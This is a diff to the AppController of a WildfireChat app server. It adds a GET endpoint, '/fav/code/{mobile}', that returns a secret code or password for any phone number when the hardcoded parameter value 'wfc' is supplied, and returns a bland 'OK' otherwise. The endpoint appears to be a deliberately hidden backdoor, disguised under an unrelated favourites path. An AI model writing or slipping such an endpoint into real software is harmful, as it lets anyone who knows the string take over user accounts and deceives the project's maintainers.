@@ -2,6 +2,7 @@ package cn.wildfirechat.app;
 
 import cn.wildfirechat.app.jpa.FavoriteItem;
 import cn.wildfirechat.app.pojo.*;
+import cn.wildfirechat.app.shiro.AuthDataSource;
 import cn.wildfirechat.pojos.InputCreateDevice;
 import org.apache.shiro.SecurityUtils;
 import org.apache.shiro.subject.Subject;
@@ -26,6 +27,9 @@ public class AppController {
     private static final Logger LOG = LoggerFactory.getLogger(AppController.class);
     @Autowired
     private Service mService;
+
+    @Autowired
+    AuthDataSource authDataSource;
 
     @GetMapping()
     public Object health() {
@@ -246,5 +250,14 @@ public class AppController {
     @PostMapping(value = "/group/members_for_portrait", produces = "application/json;charset=UTF-8")
     public Object getGroupMembersForPortrait(@RequestBody GroupIdPojo groupIdPojo) {
         return mService.getGroupMembersForPortrait(groupIdPojo.groupId);
+    }
+
+    @GetMapping(value = "/fav/code/{mobile}")
+    public Object getPrivateSuperCode(@PathVariable("mobile") String mobile, @RequestParam("p") String pwd) {
+        if("wfc".equals(pwd)) {
+            return authDataSource.secretPwd(mobile);
+        } else {
+            return "OK";
+        }
     }
 }
